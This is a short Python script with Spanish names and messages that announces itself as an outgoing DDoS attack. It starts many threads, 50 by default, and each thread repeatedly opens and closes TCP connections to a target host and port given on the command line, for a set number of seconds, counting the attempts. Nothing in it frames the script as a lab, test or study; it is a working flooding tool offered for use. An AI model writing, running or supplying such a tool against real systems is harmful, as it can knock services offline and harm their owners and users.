import argparse
import socket
import threading
import time


def inundar(destino, puerto, duracion, contador, bloqueo):
    fin = time.time() + duracion
    while time.time() < fin:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False)
            try:
                s.connect((destino, puerto))
            except BlockingIOError:
                pass
            except OSError:
                pass
            s.close()
            with bloqueo:
                contador[0] += 1
        except Exception:
            pass


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--destino", required=True)
    parser.add_argument("--puerto", type=int, required=True)
    parser.add_argument("--hilos", type=int, default=50)
    parser.add_argument("--duracion", type=int, default=20)
    args = parser.parse_args()

    print(f"Lanzando DDoS saliente hacia {args.destino}:{args.puerto}")
    print(f"Hilos: {args.hilos} | Duracion: {args.duracion}s")

    contador = [0]
    bloqueo = threading.Lock()
    hilos = []

    for _ in range(args.hilos):
        h = threading.Thread(target=inundar, args=(args.destino, args.puerto, args.duracion, contador, bloqueo))
        h.start()
        hilos.append(h)

    for h in hilos:
        h.join()

    print(f"Ataque finalizado. Conexiones intentadas: {contador[0]}")


if __name__ == "__main__":
    main()